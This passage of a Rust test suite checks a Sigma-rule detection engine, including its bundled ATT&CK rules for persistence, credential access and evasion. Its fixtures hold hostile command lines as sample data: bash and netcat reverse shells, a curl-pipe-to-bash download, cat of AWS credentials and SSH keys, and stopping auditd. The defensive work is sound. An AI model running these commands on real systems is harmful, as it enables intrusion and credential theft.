        assert!(rule_matches(&rule, &ev("process_creation", &[("cmdline", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")])));
        assert!(rule_matches(&rule, &ev("process_creation", &[("cmdline", "nc -e /bin/sh 1.2.3.4 4444")])));
        assert!(!rule_matches(&rule, &ev("process_creation", &[("cmdline", "ls -la")])));
    }

    #[test]
    fn startswith_and_endswith_modifiers() {
        let rule_yaml = r#"
title: Startswith Endswith Test
level: low
logsource:
  category: dns_query
detection:
  selection:
    query|endswith:
      - ".xyz"
      - ".top"
  condition: selection
"#;
        let rule = compile_rule(rule_yaml).unwrap();
        assert!(rule_matches(&rule, &ev("dns_query", &[("query", "evil.example.xyz")])));
        assert!(!rule_matches(&rule, &ev("dns_query", &[("query", "example.com")])));
    }

    #[test]
    fn and_across_fields_in_one_selection() {
        let rule_yaml = r#"
title: And Fields Test
level: high
logsource:
  category: process_creation
detection:
  sel_fetch:
    cmdline|contains: "curl"
  sel_pipe:
    cmdline|contains: "| bash"
  condition: sel_fetch and sel_pipe
"#;
        let rule = compile_rule(rule_yaml).unwrap();
        assert!(rule_matches(&rule, &ev("process_creation", &[("cmdline", "curl http://evil/x.sh | bash")])));
        assert!(!rule_matches(&rule, &ev("process_creation", &[("cmdline", "curl http://example.com/file")])));
        assert!(!rule_matches(&rule, &ev("process_creation", &[("cmdline", "echo hi | bash")])));
    }

    #[test]
    fn not_excludes_filter_selection() {
        let rule_yaml = r#"
title: Not Filter Test
level: medium
logsource:
  category: process_creation
detection:
  selection:
    cmdline|startswith: "/bin/sh -c"
  filter:
    parent_name|contains: "cron"
  condition: selection and not filter
"#;
        let rule = compile_rule(rule_yaml).unwrap();
        assert!(rule_matches(
            &rule,
            &SigmaEvent {
                category: "process_creation".into(),
                fields: [("cmdline", "/bin/sh -c whoami"), ("parent_name", "bash")]
                    .into_iter()
                    .map(|(k, v)| (k.to_string(), v.to_string()))
                    .collect(),
                ts: 1.0,
                src_ip: "10.0.0.5".into(),
                dst_ip: String::new(),
                dst_port: 0,
            }
        ));
        assert!(!rule_matches(
            &rule,
            &SigmaEvent {
                category: "process_creation".into(),
                fields: [("cmdline", "/bin/sh -c whoami"), ("parent_name", "cron")]
                    .into_iter()
                    .map(|(k, v)| (k.to_string(), v.to_string()))
                    .collect(),
                ts: 1.0,
                src_ip: "10.0.0.5".into(),
                dst_ip: String::new(),
                dst_port: 0,
            }
        ));
    }

    #[test]
    fn selection_as_list_of_maps_is_or() {
        let rule_yaml = r#"
title: List Of Maps Test
level: medium
logsource:
  category: network_connection
detection:
  selection:
    - dst_port: 23
    - dst_port: 21
  condition: selection
"#;
        let rule = compile_rule(rule_yaml).unwrap();
        assert!(rule_matches(&rule, &ev("network_connection", &[("dst_port", "23")])));
        assert!(rule_matches(&rule, &ev("network_connection", &[("dst_port", "21")])));
        assert!(!rule_matches(&rule, &ev("network_connection", &[("dst_port", "80")])));
    }

    #[test]
    fn logsource_category_routes_events_and_never_cross_fires() {
        let rule_yaml = r#"
title: Category Routing Test
level: medium
logsource:
  category: dns_query
detection:
  selection:
    query|contains: "evil"
  condition: selection
"#;
        let rule = compile_rule(rule_yaml).unwrap();
        // Same field name/value, but a process_creation event must never trigger a dns_query rule.
        assert!(!rule_matches(&rule, &ev("process_creation", &[("query", "evil.example.com")])));
        assert!(rule_matches(&rule, &ev("dns_query", &[("query", "evil.example.com")])));
    }

    #[test]
    fn missing_field_is_no_match_not_a_crash() {
        let rule_yaml = r#"
title: Missing Field Test
level: medium
logsource:
  category: process_creation
detection:
  selection:
    parent_name|contains: "nginx"
  condition: selection
"#;
        let rule = compile_rule(rule_yaml).unwrap();
        assert!(!rule_matches(&rule, &ev("process_creation", &[("cmdline", "/bin/bash")])));
    }

    // ── mitre / level extraction ──────────────────────────────────────────

    #[test]
    fn extracts_mitre_technique_from_tags() {
        let rule_yaml = r#"
title: Mitre Tag Test
level: critical
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  category: process_creation
detection:
  selection:
    cmdline|contains: "/dev/tcp/"
  condition: selection
"#;
        let rule = compile_rule(rule_yaml).unwrap();
        assert_eq!(rule.mitre, "T1059.004");
        assert_eq!(rule.level.severity(), SEV_CRITICAL);
    }

    #[test]
    fn no_technique_tag_leaves_mitre_empty_not_fabricated() {
        let rule_yaml = r#"
title: No Technique Tag Test
level: low
tags:
  - attack.discovery
logsource:
  category: process_creation
detection:
  selection:
    cmdline|contains: "whoami"
  condition: selection
"#;
        let rule = compile_rule(rule_yaml).unwrap();
        assert_eq!(rule.mitre, "");
    }

    // ── unsupported constructs: skip, never mis-fire ──────────────────────

    #[test]
    fn rejects_count_aggregation() {
        let rule_yaml = r#"
title: Aggregation Test
level: medium
logsource:
  category: network_connection
detection:
  selection:
    dst_port: 22
  condition: selection | count() by src_ip > 5
"#;
        assert!(compile_rule(rule_yaml).is_err());
    }

    #[test]
    fn rejects_one_of_them() {
        let rule_yaml = r#"
title: One Of Them Test
level: medium
logsource:
  category: network_connection
detection:
  selection1:
    dst_port: 22
  selection2:
    dst_port: 23
  condition: 1 of them
"#;
        assert!(compile_rule(rule_yaml).is_err());
    }

    #[test]
    fn rejects_timeframe() {
        let rule_yaml = r#"
title: Timeframe Test
level: medium
logsource:
  category: network_connection
detection:
  selection:
    dst_port: 22
  timeframe: 5m
  condition: selection
"#;
        assert!(compile_rule(rule_yaml).is_err());
    }

    #[test]
    fn rejects_unsupported_modifier() {
        let rule_yaml = r#"
title: Regex Modifier Test
level: medium
logsource:
  category: process_creation
detection:
  selection:
    cmdline|re: "^evil.*"
  condition: selection
"#;
        assert!(compile_rule(rule_yaml).is_err());
    }

    #[test]
    fn rejects_undefined_selection_reference() {
        let rule_yaml = r#"
title: Undefined Selection Test
level: medium
logsource:
  category: network_connection
detection:
  selection:
    dst_port: 22
  condition: selection and typo_selection
"#;
        assert!(compile_rule(rule_yaml).is_err());
    }

    // ── rule_id determinism / collision guard ─────────────────────────────

    #[test]
    fn rule_id_is_deterministic_and_in_reserved_band() {
        let a = sigma_rule_id("11111111-1111-1111-1111-111111111111");
        let b = sigma_rule_id("11111111-1111-1111-1111-111111111111");
        assert_eq!(a, b);
        assert!(a >= SIGMA_RULE_ID_BASE);
        // Far above every other engine's band (all < 10_000_000 per the module doc's audit).
        assert!(a > 10_000_000);
    }

    #[test]
    fn different_rule_ids_usually_differ() {
        let a = sigma_rule_id("rule-one");
        let b = sigma_rule_id("rule-two");
        assert_ne!(a, b);
    }

    // ── event construction from raw JSON ──────────────────────────────────

    #[test]
    fn event_from_flow_json_routes_dns_and_conn() {
        let conn = serde_json::json!({"type":"conn","ts":1.0,"src_ip":"10.0.0.5","dst_ip":"1.2.3.4","dst_port":23,"proto":"tcp"});
        let e = event_from_flow_json(&conn).unwrap();
        assert_eq!(e.category, "network_connection");
        assert_eq!(e.fields.get("dst_port").unwrap(), "23");

        let dns = serde_json::json!({"type":"dns","ts":1.0,"src_ip":"10.0.0.5","dst_ip":"8.8.8.8","dst_port":53,"query":"evil.xyz"});
        let e2 = event_from_flow_json(&dns).unwrap();
        assert_eq!(e2.category, "dns_query");
        assert_eq!(e2.fields.get("query").unwrap(), "evil.xyz");
    }

    #[test]
    fn event_from_host_json_carries_parent_name_when_known() {
        let proc = serde_json::json!({"type":"process","ts":1.0,"device_ip":"10.0.0.5","pid":100,"parent_pid":50,"name":"bash","cmdline":"/bin/bash"});
        let e = event_from_host_json(&proc, Some("nginx")).unwrap();
        assert_eq!(e.category, "process_creation");
        assert_eq!(e.fields.get("parent_name").unwrap(), "nginx");
    }

    #[test]
    fn event_from_host_json_without_parent_name_omits_field_not_fabricates() {
        let proc = serde_json::json!({"type":"process","ts":1.0,"device_ip":"10.0.0.5","pid":100,"parent_pid":0,"name":"bash","cmdline":"/bin/bash"});
        let e = event_from_host_json(&proc, None).unwrap();
        assert!(!e.fields.contains_key("parent_name"));
    }

    // ── end-to-end: bundled rules load, fire, and the "skip unsupported" contract holds ────────

    #[test]
    fn bundled_rules_load_and_the_deliberately_unsupported_fixture_is_skipped_with_a_reason() {
        let (rules, skipped) = load_bundled_rules();
        assert!(!rules.is_empty(), "expected at least one bundled rule to load");
        let skipped_names: Vec<&str> = skipped.iter().map(|(n, _)| n.as_str()).collect();
        assert!(
            skipped_names.contains(&"sigma_unsupported_aggregation.yml"),
            "the deliberately-unsupported fixture must be skipped, not silently mis-evaluated"
        );
        // every OTHER bundled rule must have compiled cleanly
        assert_eq!(skipped.len(), 1, "unexpected skip(s): {skipped:?}");
        // 5 original + 14 new (2026-07-08 ATT&CK coverage expansion) = 19 compiled rules.
        assert_eq!(rules.len(), 19, "expected 19 compiled bundled rules: {:?}", rules.iter().map(|r| &r.title).collect::<Vec<_>>());
    }

    #[test]
    fn bundled_reverse_shell_rule_fires_on_a_real_reverse_shell_cmdline() {
        let (rules, _) = load_bundled_rules();
        let event = SigmaEvent {
            category: "process_creation".into(),
            fields: [("cmdline", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1")]
                .into_iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
            ts: 42.0,
            src_ip: "10.0.0.5".into(),
            dst_ip: String::new(),
            dst_port: 0,
        };
        let alerts = evaluate_event(&rules, &event);
        assert!(!alerts.is_empty(), "expected the bundled reverse-shell rule to fire");
        assert!(alerts.iter().any(|a| a.category == "sigma_match"));
    }

    #[test]
    fn benign_event_never_fires_bundled_rules() {
        let (rules, _) = load_bundled_rules();
        let event = SigmaEvent {
            category: "process_creation".into(),
            fields: [("cmdline", "ls -la /home/user"), ("name", "ls")]
                .into_iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
            ts: 42.0,
            src_ip: "10.0.0.5".into(),
            dst_ip: String::new(),
            dst_port: 0,
        };
        assert!(evaluate_event(&rules, &event).is_empty());
    }

    // ── 2026-07-08 ATT&CK coverage expansion: one fire+near-miss fixture per NEW bundled rule ──
    // Precisely targets each rule by its OWN sigma_id (the `id:` field in its YAML) rather than
    // scanning `evaluate_event`'s combined output — several new rules deliberately share a MITRE
    // tag (both `sigma_doh_resolver_usage.yml` and `sigma_oob_callback_dns.yml` are T1071.004), so
    // asserting by rule identity, not by tag, is the only unambiguous way to prove EACH rule's own
    // match logic against a real event shape.

    fn find_rule<'a>(rules: &'a [SigmaRule], sigma_id: &str) -> &'a SigmaRule {
        rules
            .iter()
            .find(|r| r.sigma_id == sigma_id)
            .unwrap_or_else(|| panic!("bundled rule with sigma_id={sigma_id} did not compile/load"))
    }

    #[test]
    fn rc_local_persistence_rule_fires_on_rc_local_write_not_on_rc_conf() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "6ac352c3-4c95-46e1-adc4-45ed35a054be");
        assert!(rule_matches(rule, &ev("file_event", &[("path", "/etc/rc.local")])));
        assert!(!rule_matches(rule, &ev("file_event", &[("path", "/etc/rc.conf")])));
    }

    #[test]
    fn sudoers_tamper_rule_fires_on_sudoers_d_write_not_on_sshd_config() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "e6140da4-729f-4981-963f-c5aeeea0e2ae");
        assert!(rule_matches(rule, &ev("file_event", &[("path", "/etc/sudoers.d/backdoor")])));
        assert!(!rule_matches(rule, &ev("file_event", &[("path", "/etc/ssh/sshd_config")])));
    }

    #[test]
    fn pam_config_tamper_rule_fires_on_pam_d_write_not_on_etc_passwd() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "97ff6595-8133-4475-af26-b67ef7da16f9");
        assert!(rule_matches(rule, &ev("file_event", &[("path", "/etc/pam.d/sshd")])));
        assert!(!rule_matches(rule, &ev("file_event", &[("path", "/etc/passwd")])));
    }

    #[test]
    fn web_shell_drop_rule_fires_on_php_under_webroot_not_on_html_or_non_webroot_php() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "77cee8ed-843b-4de6-b871-b09b843e3601");
        assert!(rule_matches(rule, &ev("file_event", &[("path", "/var/www/html/shell.php")])));
        assert!(!rule_matches(rule, &ev("file_event", &[("path", "/var/www/html/index.html")])), "wrong extension must not match");
        assert!(!rule_matches(rule, &ev("file_event", &[("path", "/opt/app/shell.php")])), "outside a web root must not match");
    }

    #[test]
    fn ssh_private_key_access_rule_fires_on_cat_not_on_the_ssh_toolchain_itself() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "de6f89f5-949f-4187-9c78-f5126fed8459");
        assert!(rule_matches(
            rule,
            &ev("process_creation", &[("name", "cat"), ("cmdline", "cat /home/user/.ssh/id_rsa")])
        ));
        assert!(
            !rule_matches(
                rule,
                &ev("process_creation", &[("name", "ssh"), ("cmdline", "ssh -i /home/user/.ssh/id_rsa host")])
            ),
            "ssh itself using -i must be filtered out"
        );
    }

    #[test]
    fn credential_file_access_rule_fires_on_cat_not_on_a_non_listed_tool() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "03071e15-6adc-40f2-bd8e-e39190c69ea3");
        assert!(rule_matches(
            rule,
            &ev("process_creation", &[("name", "cat"), ("cmdline", "cat /root/.aws/credentials")])
        ));
        assert!(
            !rule_matches(
                rule,
                &ev("process_creation", &[("name", "python3"), ("cmdline", "python3 script.py /root/.aws/credentials")])
            ),
            "tool not in the watched list must not match"
        );
    }

    #[test]
    fn local_port_scanner_exec_rule_fires_on_nmap_not_on_netstat() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "8fad0e7f-03d0-41dd-bb8f-77014de6f378");
        assert!(rule_matches(rule, &ev("process_creation", &[("cmdline", "nmap -sS 10.0.0.0/24")])));
        assert!(!rule_matches(rule, &ev("process_creation", &[("cmdline", "netstat -tulpn")])));
    }

    #[test]
    fn privesc_enum_tool_exec_rule_fires_on_linpeas_not_on_an_ordinary_script() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "d014e710-349d-49c4-baaa-d622c00203e4");
        assert!(rule_matches(rule, &ev("process_creation", &[("cmdline", "./linpeas.sh")])));
        assert!(!rule_matches(rule, &ev("process_creation", &[("cmdline", "./deploy.sh")])));
    }

    #[test]
    fn doh_resolver_usage_rule_fires_on_known_doh_sni_not_on_an_ordinary_site() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "c592e765-96ce-4af9-b8ab-e3de17c3c210");
        assert!(rule_matches(rule, &ev("network_connection", &[("dst_port", "443"), ("tls_sni", "dns.google")])));
        assert!(!rule_matches(rule, &ev("network_connection", &[("dst_port", "443"), ("tls_sni", "example.com")])));
    }

    #[test]
    fn dns_tunnel_tool_exec_rule_fires_on_iodine_not_on_an_unrelated_exec() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "1f9555b2-cfe5-472e-a4b5-0d64483c3956");
        assert!(rule_matches(rule, &ev("process_creation", &[("cmdline", "iodine -f -P secret t.tunnel.example.com")])));
        assert!(!rule_matches(rule, &ev("process_creation", &[("cmdline", "ssh user@10.0.0.5")])));
    }

    #[test]
    fn oob_callback_dns_rule_fires_on_known_service_domain_not_on_an_ordinary_domain() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "dd05e4da-79f3-4efb-b9c9-6462e2589d73");
        assert!(rule_matches(rule, &ev("dns_query", &[("query", "abc123.oastify.com")])));
        assert!(!rule_matches(rule, &ev("dns_query", &[("query", "google.com")])));
    }

    #[test]
    fn secure_delete_tool_exec_rule_fires_on_shred_not_on_plain_rm() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "50b0ba68-f027-4efa-822e-81a498893520");
        assert!(rule_matches(rule, &ev("process_creation", &[("cmdline", "shred -u /tmp/evidence.log")])));
        assert!(!rule_matches(rule, &ev("process_creation", &[("cmdline", "rm -f /tmp/evidence.log")])));
    }

    #[test]
    fn security_tooling_disabled_rule_fires_on_stop_auditd_not_on_status_query() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "40a45172-a8a2-4e7c-88a4-563ebf1601df");
        assert!(rule_matches(rule, &ev("process_creation", &[("cmdline", "systemctl stop auditd")])));
        assert!(!rule_matches(rule, &ev("process_creation", &[("cmdline", "systemctl status auditd")])));
    }

    #[test]
    fn sshpass_lateral_movement_rule_fires_on_sshpass_not_on_plain_ssh() {
        let (rules, _) = load_bundled_rules();
        let rule = find_rule(&rules, "47c1b52b-ea16-4213-8551-4688f308451e");
        assert!(rule_matches(rule, &ev("process_creation", &[("cmdline", "sshpass -p secret123 ssh user@10.0.0.5")])));
        assert!(!rule_matches(rule, &ev("process_creation", &[("cmdline", "ssh user@10.0.0.5")])));
    }
}
